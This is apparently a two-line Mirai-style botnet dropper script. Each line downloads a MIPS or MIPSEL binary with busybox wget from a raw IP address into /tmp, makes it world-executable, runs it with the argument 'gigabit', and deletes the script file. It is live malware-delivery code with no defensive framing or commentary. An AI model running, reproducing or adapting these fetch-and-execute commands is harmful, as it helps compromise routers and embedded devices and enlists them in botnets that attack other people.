cd /tmp;busybox wget http://45.95.146.126/splmips; chmod 777 splmips; ./splmips gigabit;rm -rf n3881.sh
cd /tmp;busybox wget http://45.95.146.126/splmpsl; chmod 777 splmpsl; ./splmpsl gigabit;rm -rf n3881.sh
